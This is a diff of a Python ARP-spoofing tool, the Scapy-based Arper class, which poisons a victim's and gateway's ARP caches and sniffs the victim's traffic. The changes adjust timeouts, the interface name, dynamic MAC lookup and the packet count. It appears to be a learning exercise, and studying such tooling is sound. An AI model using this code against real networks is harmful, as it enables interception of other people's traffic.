@@ -9,20 +9,20 @@ import time
 def get_mac_addr(target_ip):
     # We build a packet that is going to be broadcasted to all nodes
     packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=target_ip)
-    response, _ =srp(packet, timeout=2, retry=10, verbose=False)
-    # print(response)
+    response, _ = srp(packet, timeout=1, retry=5, verbose=False)
+    print(response, _)
     for _, r in response:
-        return r[Ether].src
+       return r[Ether].src
     return None
 
 class Arper:
-    def __init__(self, victim, gateway, interface='en0'):
+    def __init__(self, victim, gateway, interface='eth0'):
         self.victim = victim
-        #self.victim_mac = get_mac_addr(victim)
-        self.victim_mac = 'b0:be:83:4e:e2:36'
+        self.victim_mac = get_mac_addr(victim)
+        #self.victim_mac = get_mac(victim)
         self.gateway = gateway
-        #self.gateway_mac = get_mac_addr(gateway)
-        self.gateway_mac = '6c:ba:b8:ce:b6:93' 
+        self.gateway_mac = get_mac_addr(gateway)
+        #self.gateway_mac = get_mac(gateway)
         self.interface = interface
         conf.iface = interface
         conf.verb = 0
@@ -78,7 +78,7 @@ class Arper:
             else:
                 time.sleep(2)
 
-    def sniff(self, count=50):
+    def sniff(self, count=500):
         time.sleep(5)
         print(f'Sniffing {count} packets')
         bpf_filter = "ip host %s" %victim
@@ -100,4 +100,3 @@ if __name__=='__main__':
     (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
     myarp = Arper(victim, gateway, interface)
     myarp.run()
-   #get_mac_addr('10.0.2.15')
